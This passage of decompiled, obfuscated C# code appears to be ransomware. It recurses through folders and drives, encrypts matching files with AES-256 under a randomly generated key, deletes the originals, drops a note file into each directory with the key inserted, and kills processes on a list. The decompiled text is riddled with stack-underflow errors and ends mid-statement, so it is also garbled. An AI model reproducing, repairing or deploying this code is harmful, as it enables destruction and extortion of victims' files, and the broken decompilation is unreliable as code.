			int num2;
			int num3;
			if (0 == 0)
			{
				int num = 16;
				while (true)
				{
					ptr = stackalloc byte[num];
					num2 = _0003._0001((_0004._0005._0002)/*Error near IL_001c: Stack underflow*/, 9);
					if ((int)/*Error near IL_0028: Stack underflow*/ < 0)
					{
						break;
					}
					_ = ((_0004._0005._0004)/*Error near IL_0032: Stack underflow*/)._0001;
					num3 = ((short[])/*Error near IL_0038: Stack underflow*/)[/*Error near IL_0038: Stack underflow*/];
					if ((int)/*Error near IL_0041: Stack underflow*/ < 0)
					{
						goto IL_005d;
					}
					if (0 == 0)
					{
						_003F val = /*Error near IL_0051: Stack underflow*/& 0xF;
						_0003._0001((_0004._0005._0002)/*Error near IL_014f: Stack underflow*/, (int)val);
						num = num3;
						if (0 == 0)
						{
							return num >> 4;
						}
						continue;
					}
					goto IL_00bb;
				}
				*(int*)((byte*)ptr + 12) = P_1._0003;
				num2 = _0003._0001(P_1, *(int*)((byte*)ptr + 12));
				goto IL_00f2;
			}
			goto IL_00fb;
			IL_005d:
			*(int*)ptr = -(num3 >> 4);
			*(int*)((byte*)ptr + 4) = num3 & 0xF;
			if ((num2 = _0003._0001(P_1, *(int*)((byte*)ptr + 4))) >= 0)
			{
				num3 = P_0._0001[*(int*)ptr | (num2 >> 9)];
				_0003._0001(P_1, num3 & 0xF);
				return num3 >> 4;
			}
			*(int*)((byte*)ptr + 8) = P_1._0003;
			num2 = _0003._0001(P_1, *(int*)((byte*)ptr + 8));
			num3 = P_0._0001[*(int*)ptr | (num2 >> 9)];
			goto IL_00bb;
			IL_00bb:
			if (4u != 0)
			{
				if ((num3 & 0xF) <= *(int*)((byte*)ptr + 8))
				{
					_0003._0001(P_1, num3 & 0xF);
					if (0 == 0)
					{
						return num3 >> 4;
					}
					goto IL_00f2;
				}
				return -1;
			}
			goto IL_00ff;
			IL_0118:
			return -1;
			IL_00f2:
			num3 = P_0._0001[num2];
			goto IL_00fb;
			IL_00ff:
			if ((num3 & 0xF) <= *(int*)((byte*)ptr + 12))
			{
				_0003._0001(P_1, num3 & 0xF);
				return num3 >> 4;
			}
			goto IL_0118;
			IL_00fb:
			if (num3 >= 0)
			{
				goto IL_00ff;
			}
			goto IL_0118;
		}

		unsafe static bool _0001(_0004._0005._0001 P_0)
		{
			//IL_001e: Unknown result type (might be due to invalid IL or missing references)
			//IL_0050: Expected I4, but got Unknown
			//IL_0211: Incompatible stack heights: 0 vs 1
			//IL_021d: Incompatible stack heights: 0 vs 1
			//IL_0223: Incompatible stack heights: 0 vs 1
			//IL_0229: Incompatible stack heights: 0 vs 1
			//IL_022f: Incompatible stack heights: 0 vs 1
			//IL_0235: Incompatible stack heights: 0 vs 1
			//IL_023f: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			int num = ((_0004._0005._0001)/*Error near IL_0013: Stack underflow*/)._0001;
			int num3;
			int num2;
			switch (/*Error near IL_001f: Stack underflow*/ - 2)
			{
			case 0:
				if (((_0004._0005._0001)/*Error near IL_005f: Stack underflow*/)._0001)
				{
					((_0004._0005._0001)/*Error near IL_006d: Stack underflow*/)._0001 = 12;
					return false;
				}
				_0003._0001(((_0004._0005._0001)/*Error near IL_007e: Stack underflow*/)._0001, 3);
				*(_003F*)(nint)/*Error near IL_0085: Stack underflow*/ = /*Error near IL_0085: Stack underflow*/;
				if (*(int*)ptr < 0)
				{
					return false;
				}
				_0003._0001(P_0._0001, 3);
				if (((uint)(*(int*)ptr) & (true ? 1u : 0u)) != 0)
				{
					goto IL_009e;
				}
				goto IL_00a5;
			case 1:
				num3 = (P_0._0005 = _0003._0001(P_0._0001, 16));
				if (0 == 0)
				{
					if (num3 < 0)
					{
						return false;
					}
					_0003._0001(P_0._0001, 16);
					P_0._0001 = 4;
					goto case 2;
				}
				goto IL_014d;
			case 2:
				num3 = _0003._0001(P_0._0001, 16);
				goto IL_014d;
			case 3:
				*(int*)((byte*)ptr + 4) = _0003._0001(P_0._0001, P_0._0001, P_0._0005);
				P_0._0005 -= *(int*)((byte*)ptr + 4);
				goto IL_0195;
			case 4:
				num2 = (_0003._0001(P_0._0001, P_0._0001) ? 1 : 0);
				if (3 == 0)
				{
					goto IL_01a5;
				}
				if (num2 == 0)
				{
					goto IL_01cb;
				}
				P_0._0001 = _0003._0001(P_0._0001);
				P_0._0002 = _0003._0001(P_0._0001);
				P_0._0001 = 7;
				goto case 5;
			case 5:
			case 6:
			case 7:
			case 8:
				return _0003._0001(P_0);
			case 10:
				return false;
			default:
				{
					if (uint.MaxValue != 0)
					{
						return false;
					}
					goto IL_0195;
				}
				IL_0195:
				if (P_0._0005 == 0)
				{
					P_0._0001 = 2;
					num2 = 1;
					goto IL_01a5;
				}
				goto IL_01a6;
				IL_010c:
				return true;
				IL_01a5:
				return (byte)num2 != 0;
				IL_01cb:
				if (8 == 0)
				{
					goto IL_010c;
				}
				return false;
				IL_009e:
				P_0._0001 = true;
				goto IL_00a5;
				IL_014d:
				if (num3 < 0)
				{
					return false;
				}
				_0003._0001(P_0._0001, 16);
				if (0 == 0)
				{
					P_0._0001 = 5;
					goto case 3;
				}
				goto IL_01cb;
				IL_00a5:
				num = *(int*)ptr >> 1;
				if (false)
				{
					goto IL_009e;
				}
				switch (num)
				{
				case 0:
					_0003._0001(P_0._0001);
					P_0._0001 = 3;
					goto IL_010c;
				case 1:
					P_0._0001 = _0004._0005._0004._0001;
					P_0._0002 = _0004._0005._0004._0002;
					P_0._0001 = 7;
					goto IL_010c;
				case 2:
					break;
				default:
					goto IL_010c;
				}
				if (3u != 0)
				{
					P_0._0001 = new _0004._0005._0005();
					P_0._0001 = 6;
					goto IL_010c;
				}
				goto IL_01a6;
				IL_01a6:
				return !_0003._0001(P_0._0001);
			}
		}

		static short _0001(int P_0)
		{
			//IL_0009: Unknown result type (might be due to invalid IL or missing references)
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Unknown result type (might be due to invalid IL or missing references)
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0037: Unknown result type (might be due to invalid IL or missing references)
			//IL_0039: Unknown result type (might be due to invalid IL or missing references)
			//IL_003d: Incompatible stack heights: 0 vs 2
			//IL_0040: Incompatible stack heights: 0 vs 3
			//IL_0043: Incompatible stack heights: 0 vs 3
			//IL_0046: Incompatible stack heights: 0 vs 3
			_ = _0004._0005._0006._0001;
			_003F val = /*Error near IL_000a: Stack underflow*/& 0xF;
			_ = ((byte[])/*Error near IL_000b: Stack underflow*/)[val] << 12;
			_ = _0004._0005._0006._0001;
			_003F val2 = /*Error near IL_0017: Stack underflow*/>> 4;
			byte num = ((byte[])/*Error near IL_001b: Stack underflow*/)[val2 & 0xF];
			_ = /*Error near IL_001e: Stack underflow*/| (num << 8);
			_ = _0004._0005._0006._0001;
			_003F val3 = /*Error near IL_0027: Stack underflow*/>> 8;
			byte num2 = ((byte[])/*Error near IL_002b: Stack underflow*/)[val3 & 0xF];
			_ = /*Error near IL_002e: Stack underflow*/| (num2 << 4);
			_ = _0004._0005._0006._0001;
			_003F val4 = /*Error near IL_0038: Stack underflow*/>> 12;
			byte num3 = ((byte[])/*Error near IL_0039: Stack underflow*/)[val4];
			return (short)(/*Error near IL_003a: Stack underflow*/ | num3);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		unsafe static int _0001(_0004._0005._0002 P_0, byte[] P_1, int P_2, int P_3)
		{
			//IL_0108: Incompatible stack heights: 0 vs 1
			//IL_010e: Incompatible stack heights: 0 vs 1
			//IL_0115: Incompatible stack heights: 0 vs 1
			//IL_011b: Incompatible stack heights: 0 vs 1
			//IL_0121: Incompatible stack heights: 0 vs 1
			//IL_0127: Incompatible stack heights: 0 vs 1
			//IL_012d: Incompatible stack heights: 0 vs 1
			//IL_0133: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[12];
			*(int*)(nint)/*Error near IL_0011: Stack underflow*/ = 0;
			while (P_0._0003 > 0 && P_3 > 0)
			{
				P_2++;
				uint num = ((_0004._0005._0002)/*Error near IL_002b: Stack underflow*/)._0001;
				((sbyte[])/*Error near IL_002d: Stack underflow*/)[/*Error near IL_002d: Stack underflow*/] = (sbyte)(byte)num;
				uint num2 = ((_0004._0005._0002)/*Error near IL_003c: Stack underflow*/)._0001;
				((_0004._0005._0002)/*Error near IL_0043: Stack underflow*/)._0001 = num2 >> 8;
				int num3 = ((_0004._0005._0002)/*Error near IL_0052: Stack underflow*/)._0003;
				((_0004._0005._0002)/*Error near IL_0059: Stack underflow*/)._0003 = num3 - 8;
				P_3--;
				(*(int*)ptr)++;
			}
			if (P_3 == 0)
			{
				return *(int*)ptr;
			}
			*(int*)((byte*)ptr + 4) = P_0._0002 - P_0._0001;
			if (P_3 > *(int*)((byte*)ptr + 4))
			{
				P_3 = *(int*)((byte*)ptr + 4);
			}
			Array.Copy(P_0._0001, P_0._0001, P_1, P_2, P_3);
			P_0._0001 += P_3;
			if (((uint)(P_0._0001 - P_0._0002) & (true ? 1u : 0u)) != 0)
			{
				byte[] array = P_0._0001;
				*(int*)((byte*)ptr + 8) = P_0._0001;
				P_0._0001 = *(int*)((byte*)ptr + 8) + 1;
				P_0._0001 = array[*(int*)((byte*)ptr + 8)] & 0xFFu;
				P_0._0003 = 8;
			}
			return *(int*)ptr + P_3;
		}

		static void _0001(string P_0, byte[] P_1)
		{
			//IL_01ea: Incompatible stack heights: 0 vs 1
			//IL_01f4: Incompatible stack heights: 0 vs 1
			//IL_020a: Incompatible stack heights: 0 vs 1
			//IL_0216: Incompatible stack heights: 0 vs 1
			//IL_021c: Incompatible stack heights: 0 vs 1
			//IL_0222: Incompatible stack heights: 0 vs 1
			try
			{
				_0003._0001((string)/*Error near IL_01f4: Stack underflow*/);
				FileInfo[] array = (FileInfo[])/*Error near IL_01fa: Stack underflow*/;
				int num = 0;
				while (true)
				{
					int num2 = num;
					while (true)
					{
						if (num2 < array.Length)
						{
							new global::_0002._0001._0001();
							global::_0002._0001._0001 CS_0024_003C_003E8__locals0;
							if (2u != 0)
							{
								CS_0024_003C_003E8__locals0 = (global::_0002._0001._0001)/*Error near IL_0210: Stack underflow*/;
							}
							object obj = ((object[])/*Error near IL_0036: Stack underflow*/)[/*Error near IL_0036: Stack underflow*/];
							((global::_0002._0001._0001)/*Error near IL_003b: Stack underflow*/)._0001 = (FileInfo)obj;
							try
							{
								if (5u != 0 && Array.Exists(global::_0003._0001._0001, delegate
								{
									//IL_0013: Incompatible stack heights: 0 vs 1
									//IL_0016: Incompatible stack heights: 0 vs 1
									//IL_001d: Incompatible stack heights: 0 vs 1
									//IL_0024: Incompatible stack heights: 0 vs 1
									//IL_002b: Incompatible stack heights: 0 vs 1
									//IL_0032: Incompatible stack heights: 0 vs 1
									_ = ((global::_0002._0001._0001)/*Error near IL_0009: Stack underflow*/)._0001.FullName;
									Path.GetExtension((string?)/*Error near IL_0024: Stack underflow*/);
									((string)/*Error near IL_002b: Stack underflow*/).ToLower();
									_ = (string?)/*Error near IL_0032: Stack underflow*/ == (string?)/*Error near IL_0032: Stack underflow*/;
									return (byte)/*Error near IL_0012: Stack underflow*/ != 0;
								}))
								{
									try
									{
										if ((File.GetAttributes(CS_0024_003C_003E8__locals0._0001.FullName) & FileAttributes.System) != FileAttributes.System && !(CS_0024_003C_003E8__locals0._0001.Name == global::_0003._0001._0002))
										{
											string fullName = CS_0024_003C_003E8__locals0._0001.FullName;
											string text = CS_0024_003C_003E8__locals0._0001.FullName + global::_0003._0001._0004;
											if (_0003._0001(_0005._0001._0001, P_1, fullName, text))
											{
												File.Delete(CS_0024_003C_003E8__locals0._0001.FullName);
											}
										}
									}
									catch (Exception)
									{
									}
								}
							}
							catch (UnauthorizedAccessException)
							{
							}
							if (3u != 0)
							{
								num = num2;
								if (5 == 0)
								{
									break;
								}
								num2 = num + 1;
								continue;
							}
							goto IL_00f4;
						}
						DirectoryInfo[] array2 = _0003._0001(P_0);
						num2 = 0;
						goto IL_01d5;
						IL_01ce:
						int num3 = num2;
						nint num4 = 1;
						if (true)
						{
							num2 = num3 + 1;
							goto IL_01d5;
						}
						goto IL_01d8;
						IL_01d5:
						num3 = num2;
						num4 = (nint)array2.LongLength;
						goto IL_01d8;
						IL_00f4:
						DirectoryInfo directoryInfo = array2[num2];
						try
						{
							string text2 = directoryInfo.Name.ToLower();
							if (!text2.Contains(global::_0003._0002._0001(107388601)) && (6 == 0 || (!text2.Contains(global::_0003._0002._0001(107388556)) && !text2.Contains(global::_0003._0002._0001(107388571)) && !text2.Contains(global::_0003._0002._0001(107388518)) && !text2.Contains(global::_0003._0002._0001(107388489)) && !text2.Contains(global::_0003._0002._0001(107388504)) && !text2.Contains(global::_0003._0002._0001(107388455)))))
							{
								try
								{
									File.WriteAllBytes(Path.Combine(directoryInfo.FullName, global::_0003._0001._0002), Encoding.UTF8.GetBytes(global::_0003._0001._0003));
								}
								catch (Exception)
								{
								}
								_0003._0001(directoryInfo.FullName, P_1);
							}
						}
						catch (Exception)
						{
						}
						goto IL_01ce;
						IL_01d8:
						if (num3 < (int)num4)
						{
							goto IL_00f4;
						}
						if (8 == 0)
						{
							goto IL_01d5;
						}
						if (8u != 0)
						{
							return;
						}
						goto IL_01ce;
					}
				}
			}
			catch (Exception)
			{
			}
		}

		static int _0001(_0004._0005._0003 P_0)
		{
			//IL_0009: Incompatible stack heights: 0 vs 1
			return ((_0004._0005._0003)/*Error near IL_0007: Stack underflow*/)._0002;
		}

		static void _0001(_0004._0005._0002 P_0)
		{
			//IL_0015: Unknown result type (might be due to invalid IL or missing references)
			//IL_001b: Expected I4, but got Unknown
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 2
			//IL_0037: Incompatible stack heights: 0 vs 1
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = ((_0004._0005._0002)/*Error near IL_0009: Stack underflow*/)._0001;
			int num = ((_0004._0005._0002)/*Error near IL_0010: Stack underflow*/)._0003;
			_003F val = /*Error near IL_0016: Stack underflow*/>> (num & 7);
			((_0004._0005._0002)/*Error near IL_001b: Stack underflow*/)._0001 = (uint)(int)val;
			int num2 = ((_0004._0005._0002)/*Error near IL_0024: Stack underflow*/)._0003;
			((_0004._0005._0002)/*Error near IL_002c: Stack underflow*/)._0003 = num2 & -8;
		}

		unsafe static string _0001(byte[] P_0)
		{
			//IL_0017: Unknown result type (might be due to invalid IL or missing references)
			//IL_0057: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			//IL_0063: Incompatible stack heights: 0 vs 1
			//IL_0066: Incompatible stack heights: 0 vs 1
			//IL_0069: Incompatible stack heights: 0 vs 2
			//IL_006c: Incompatible stack heights: 0 vs 1
			StringBuilder stringBuilder;
			do
			{
				void* ptr = stackalloc byte[5];
				new StringBuilder();
				stringBuilder = (StringBuilder)/*Error near IL_005a: Stack underflow*/;
				byte[] array = (byte[])/*Error near IL_0060: Stack underflow*/;
				*(int*)(nint)/*Error near IL_0012: Stack underflow*/ = 0;
				while (*(int*)ptr < array.Length)
				{
					_ = /*Error near IL_0018: Stack underflow*/+ 4;
					int num = *(int*)(nint)/*Error near IL_001d: Stack underflow*/;
					byte num2 = ((byte[])/*Error near IL_001e: Stack underflow*/)[num];
					*(byte*)(nint)/*Error near IL_001f: Stack underflow*/ = num2;
					stringBuilder.Append(((byte*)ptr)[4].ToString(global::_0003._0002._0001(107388418)));
					(*(int*)ptr)++;
				}
			}
			while (false);
			return stringBuilder.ToString();
		}

		static int _0001(_0004._0005._0002 P_0)
		{
			//IL_0011: Unknown result type (might be due to invalid IL or missing references)
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_0026: Expected I4, but got Unknown
			//IL_0027: Incompatible stack heights: 0 vs 1
			//IL_002a: Incompatible stack heights: 0 vs 2
			//IL_002d: Incompatible stack heights: 0 vs 2
			int num = ((_0004._0005._0002)/*Error near IL_0007: Stack underflow*/)._0002;
			int num2;
			while (true)
			{
				num2 = ((_0004._0005._0002)/*Error near IL_000e: Stack underflow*/)._0001;
				if (false)
				{
					break;
				}
				num = /*Error near IL_0012: Stack underflow*/- num2;
				if (false)
				{
					continue;
				}
				num2 = ((_0004._0005._0002)/*Error near IL_001c: Stack underflow*/)._0003;
				break;
			}
			do
			{
				if (0 == 0)
				{
					num2 >>= 3;
				}
			}
			while (false);
			return /*Error near IL_0025: Stack underflow*/+ num2;
		}

		unsafe static bool _0001(_0005._0001 P_0, byte[] P_1, string P_2, string P_3)
		{
			//IL_001c: Invalid comparison between Unknown and I4
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_0109: Incompatible stack heights: 0 vs 1
			//IL_029b: Incompatible stack heights: 0 vs 1
			//IL_02a1: Incompatible stack heights: 0 vs 1
			//IL_02ab: Incompatible stack heights: 0 vs 1
			byte* num = stackalloc byte[5];
			void* ptr;
			if (3u != 0)
			{
				ptr = num;
			}
			try
			{
				byte[] array = new byte[8];
				if ((int)/*Error near IL_0021: Stack underflow*/ != 1)
				{
					goto IL_0124;
				}
				new FileStream((string)/*Error near IL_02ab: Stack underflow*/, FileMode.Open, FileAccess.ReadWrite);
				FileStream fileStream = (FileStream)/*Error near IL_02b2: Stack underflow*/;
				try
				{
					((Stream)/*Error near IL_0109: Stack underflow*/).Seek(-16L, SeekOrigin.End);
					byte[] array2 = new byte[16];
					while (true)
					{
						fileStream.Read(array2, 0, array2.Length);
						if (array2[array.Length] != 46 && array2[array.Length + 1] != 69 && array2[array.Length + 2] != 78)
						{
							if (-1 == 0)
							{
								continue;
							}
							if (array2[array.Length + 3] != 67 && array2[array.Length + 4] != 82 && array2[array.Length + 5] != 89 && array2[array.Length + 6] != 80 && array2[array.Length + 7] != 84)
							{
								((byte*)ptr)[4] = 0;
								break;
							}
						}
						fileStream.SetLength(Math.Max(0L, fileStream.Length - 16));
						*(int*)ptr = 0;
						while (*(int*)ptr < array.Length)
						{
							array[*(int*)ptr] = array2[*(int*)ptr];
							(*(int*)ptr)++;
						}
						goto IL_0124;
					}
				}
				finally
				{
					while (fileStream != null)
					{
						if (uint.MaxValue != 0)
						{
							((IDisposable)fileStream).Dispose();
							break;
						}
					}
				}
				goto end_IL_000b;
				IL_0124:
				if (P_0 == _0005._0001._0001)
				{
					new RNGCryptoServiceProvider().GetNonZeroBytes(array);
				}
				RijndaelManaged rijndaelManaged;
				do
				{
					rijndaelManaged = new RijndaelManaged();
					rijndaelManaged.Mode = CipherMode.CBC;
					rijndaelManaged.KeySize = 256;
					rijndaelManaged.BlockSize = 128;
				}
				while (-1 == 0);
				rijndaelManaged.Padding = PaddingMode.PKCS7;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(_0003._0001(P_1), array, 5000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				FileStream fileStream2 = new FileStream(P_2, FileMode.Open, FileAccess.Read);
				try
				{
					using FileStream fileStream3 = new FileStream(P_3, FileMode.CreateNew, FileAccess.Write);
					CryptoStream cryptoStream;
					if (P_0 == _0005._0001._0001)
					{
						cryptoStream = new CryptoStream(fileStream2, rijndaelManaged.CreateEncryptor(rijndaelManaged.Key, rijndaelManaged.IV), CryptoStreamMode.Read);
						goto IL_01cc;
					}
					goto IL_021f;
					IL_0268:
					if (false)
					{
						goto IL_01cc;
					}
					goto end_IL_01ad;
					IL_021f:
					CryptoStream cryptoStream2;
					int num2;
					int num3;
					int num4 = default(int);
					if (P_0 == _0005._0001._0002)
					{
						cryptoStream2 = new CryptoStream(fileStream2, rijndaelManaged.CreateDecryptor(rijndaelManaged.Key, rijndaelManaged.IV), CryptoStreamMode.Read);
						while (4u != 0)
						{
							num2 = cryptoStream2.ReadByte();
							num3 = num2;
							if (false)
							{
								goto IL_01e6;
							}
							num4 = num3;
							if (num2 != -1)
							{
								fileStream3.WriteByte((byte)num4);
								continue;
							}
							goto IL_0261;
						}
						goto IL_01ef;
					}
					goto IL_0268;
					IL_01cc:
					if (6 == 0)
					{
						goto IL_01d1;
					}
					goto IL_01db;
					IL_01d1:
					fileStream3.WriteByte((byte)num4);
					goto IL_01db;
					IL_01ef:
					byte[] bytes = Encoding.UTF8.GetBytes(global::_0003._0002._0001(107388445));
					fileStream3.Write(array, 0, array.Length);
					fileStream3.Write(bytes, 0, bytes.Length);
					goto IL_021f;
					IL_01db:
					num2 = (num4 = cryptoStream.ReadByte());
					num3 = -1;
					goto IL_01e6;
					IL_0261:
					cryptoStream2.Flush();
					goto IL_0268;
					IL_01e6:
					if (num2 != num3)
					{
						goto IL_01d1;
					}
					cryptoStream.Flush();
					goto IL_01ef;
					end_IL_01ad:;
				}
				finally
				{
					if (fileStream2 != null && 3u != 0)
					{
						((IDisposable)fileStream2).Dispose();
					}
				}
				((byte*)ptr)[4] = 1;
				end_IL_000b:;
			}
			catch (Exception)
			{
				((byte*)ptr)[4] = 0;
			}
			return ((byte*)ptr)[4] != 0;
		}

		unsafe static void _0001()
		{
			//IL_003d: Unknown result type (might be due to invalid IL or missing references)
			//IL_00ab: Incompatible stack heights: 0 vs 1
			//IL_00b7: Incompatible stack heights: 0 vs 1
			//IL_00bd: Incompatible stack heights: 0 vs 1
			//IL_00c3: Incompatible stack heights: 0 vs 1
			//IL_00d5: Incompatible stack heights: 0 vs 1
			void* ptr = stackalloc byte[8];
			try
			{
				Process.GetProcesses();
				Process[] array = (Process[])/*Error near IL_00b1: Stack underflow*/;
				*(int*)(nint)/*Error near IL_001a: Stack underflow*/ = 0;
				while (*(int*)ptr < array.Length)
				{
					int num = *(int*)(nint)/*Error near IL_0027: Stack underflow*/;
					Process process = (Process)((object[])/*Error near IL_0028: Stack underflow*/)[num];
					string[] array2 = _0004._0003._0001;
					*(int*)(nint)(/*Error near IL_003e: Stack underflow*/ + 4) = 0;
					while (true)
					{
						int num2 = *(int*)((byte*)ptr + 4);
						if (6u != 0)
						{
							if (num2 >= array2.Length)
							{
								break;
							}
							string value = array2[*(int*)((byte*)ptr + 4)];
							if (!process.ProcessName.ToLower().Contains(value))
							{
								goto IL_007e;
							}
							num2 = process.Id;
						}
						if (num2 != Process.GetCurrentProcess().Id)
						{
							try
							{
								if (5u != 0)
								{
									process.Kill();
								}
							}
							catch (Exception)
							{
							}
						}
						goto IL_007e;
						IL_007e:
						(*(int*)((byte*)ptr + 4))++;
					}
					(*(int*)ptr)++;
				}
			}
			catch (Exception)
			{
			}
		}

		unsafe static int _0001(int P_0, int P_1, byte[] P_2, _0004._0005._0003 P_3)
		{
			//IL_0032: Invalid comparison between Unknown and I4
			//IL_005b: Unknown result type (might be due to invalid IL or missing references)
			//IL_005d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0063: Unknown result type (might be due to invalid IL or missing references)
			//IL_0065: Expected I4, but got Unknown
			//IL_007e: Incompatible stack heights: 1 vs 2
			//IL_0080: Invalid comparison between Unknown and I4
			//IL_00a1: Incompatible stack heights: 1 vs 2
			//IL_00a2: Unknown result type (might be due to invalid IL or missing references)
			//IL_00a5: Expected I4, but got Unknown
			//IL_00d2: Incompatible stack heights: 1 vs 2
			//IL_00d3: Invalid comparison between Unknown and I4
			//IL_00e7: Incompatible stack heights: 0 vs 1
			//IL_00ed: Incompatible stack heights: 0 vs 1
			//IL_00f3: Incompatible stack heights: 0 vs 1
			//IL_00f9: Incompatible stack heights: 0 vs 1
			//IL_00ff: Incompatible stack heights: 0 vs 1
			//IL_0105: Incompatible stack heights: 0 vs 1
			//IL_010b: Incompatible stack heights: 0 vs 1
			//IL_0111: Incompatible stack heights: 0 vs 2
			void* ptr = stackalloc byte[12];
			int num2;
			while (true)
			{
				int num = ((_0004._0005._0003)/*Error near IL_0019: Stack underflow*/)._0001;
				*(int*)(nint)/*Error near IL_001a: Stack underflow*/ = num;
				num2 = ((_0004._0005._0003)/*Error near IL_0029: Stack underflow*/)._0002;
				if (1 == 0)
				{
					break;
				}
				if (6u != 0)
				{
					if ((int)/*Error near IL_0034: Stack underflow*/ > num2)
					{
						P_1 = ((_0004._0005._0003)/*Error near IL_003e: Stack underflow*/)._0002;
					}
					else
					{
						_ = ((_0004._0005._0003)/*Error near IL_0051: Stack underflow*/)._0001;
						int num3 = ((_0004._0005._0003)/*Error near IL_005b: Stack underflow*/)._0002;
						_003F val = /*Error near IL_005c: Stack underflow*/- num3;
						*(int*)(nint)/*Error near IL_0065: Stack underflow*/ = (val + P_1) & 0x7FFF;
					}
					*(int*)((byte*)ptr + 4) = P_1;
					if (false)
					{
						continue;
					}
					if (0 == 0)
					{
						*(int*)((byte*)ptr + 8) = P_1 - *(int*)ptr;
						_ = *(int*)((byte*)ptr + 8);
						if (false)
						{
							goto IL_00a2;
						}
						if ((int)/*Error near IL_0082: Stack underflow*/ <= num2)
						{
							goto IL_00a9;
						}
						Array.Copy(P_3._0001, 32768 - *(int*)((byte*)ptr + 8), P_2, P_0, *(int*)((byte*)ptr + 8));
					}
					_ = *(int*)((byte*)ptr + 8);
				}
				goto IL_00a2;
				IL_00a2:
				P_0 = /*Error near IL_00a3: Stack underflow*/+ num2;
				P_1 = *(int*)ptr;
				goto IL_00a9;
				IL_00a9:
				Array.Copy(P_3._0001, *(int*)ptr - P_1, P_2, P_0, P_1);
				P_3._0002 -= *(int*)((byte*)ptr + 4);
				_ = P_3._0002;
				_ = 0;
				break;
			}
			if ((int)/*Error near IL_00d5: Stack underflow*/ < num2)
			{
				throw new InvalidOperationException();
			}
			return *(int*)((byte*)ptr + 4);
		}

		static void _0001(_0004._0005._0003 P_0, int P_1, int P_2, int P_3)
		{
			//IL_001d: Unknown result type (might be due to invalid IL or missing references)
			//IL_0023: Expected I4, but got Unknown
			//IL_0064: Incompatible stack heights: 0 vs 1
			//IL_0067: Incompatible stack heights: 0 vs 2
			//IL_006a: Incompatible stack heights: 0 vs 1
			//IL_0070: Incompatible stack heights: 0 vs 1
			//IL_0073: Incompatible stack heights: 0 vs 1
			//IL_0076: Incompatible stack heights: 0 vs 1
			//IL_007a: Incompatible stack heights: 0 vs 2
			//IL_007d: Incompatible stack heights: 0 vs 1
			if (-1 == 0)
			{
				return;
			}
			while (true)
			{
				int num = P_2;
				int num2 = num;
				do
				{
					num2--;
				}
				while (2 == 0);
				P_2 = num2;
				if (num > 0 && 5u != 0)
				{
					_ = ((_0004._0005._0003)/*Error near IL_000f: Stack underflow*/)._0001;
					int num3 = ((_0004._0005._0003)/*Error near IL_0018: Stack underflow*/)._0001;
					_003F val = /*Error near IL_001e: Stack underflow*/+ 1;
					((_0004._0005._0003)/*Error near IL_0023: Stack underflow*/)._0001 = (int)val;
					_ = ((_0004._0005._0003)/*Error near IL_002c: Stack underflow*/)._0001;
					P_1++;
					byte num4 = ((byte[])/*Error near IL_0033: Stack underflow*/)[/*Error near IL_0033: Stack underflow*/];
					((sbyte[])/*Error near IL_0034: Stack underflow*/)[/*Error near IL_0034: Stack underflow*/] = (sbyte)num4;
					int num5 = P_0._0001;
					((_0004._0005._0003)/*Error near IL_0047: Stack underflow*/)._0001 = num5 & 0x7FFF;
					int num6 = P_1;
					if (3u != 0)
					{
						num6 &= 0x7FFF;
					}
					P_1 = num6;
					continue;
				}
				break;
			}
		}

		static void _0001()
		{
			//IL_013a: Incompatible stack heights: 0 vs 1
			//IL_0140: Incompatible stack heights: 0 vs 1
			//IL_0150: Incompatible stack heights: 0 vs 1
			//IL_0156: Incompatible stack heights: 0 vs 2
			//IL_0160: Incompatible stack heights: 0 vs 1
			//IL_0170: Incompatible stack heights: 0 vs 2
			int num = 128;
			while (true)
			{
				byte[] array = new byte[num];
				new RNGCryptoServiceProvider();
				((RandomNumberGenerator)/*Error near IL_014a: Stack underflow*/).GetNonZeroBytes((byte[])/*Error near IL_014a: Stack underflow*/);
				_0002._0001 = (byte[])/*Error near IL_0028: Stack underflow*/;
				_ = global::_0003._0001._0001;
				_0003._0001((string)/*Error near IL_0160: Stack underflow*/, (byte[])/*Error near IL_0160: Stack underflow*/);
				byte[] inArray = (byte[])/*Error near IL_0166: Stack underflow*/;
				_ = global::_0003._0001._0003;
				global::_0003._0002._0001(107388432);
				string newValue = global::_0003._0001._0005;
				global::_0003._0001._0003 = ((string)/*Error near IL_0055: Stack underflow*/).Replace((string)/*Error near IL_0055: Stack underflow*/, newValue);
				global::_0003._0001._0003 = global::_0003._0001._0003.Replace(global::_0003._0002._0001(107388899), global::_0003._0001._0006);
				global::_0003._0001._0003 = global::_0003._0001._0003.Replace(global::_0003._0002._0001(107388918), Convert.ToBase64String(inArray));
				_0003._0001();
				_0002._0001();
				do
				{
					array = null;
				}
				while (8 == 0);
				DriveInfo[] drives = DriveInfo.GetDrives();
				int num2;
				do
				{
					num2 = 0;
				}
				while (2 == 0);
				while (true)
				{
					IL_00d5:
					num = num2;
					while (true)
					{
						int num3;
						if (0 == 0)
						{
							num3 = drives.Length;
							if (4 == 0)
							{
								goto IL_00d3;
							}
							if (num >= num3)
							{
								Process.Start(new ProcessStartInfo
								{
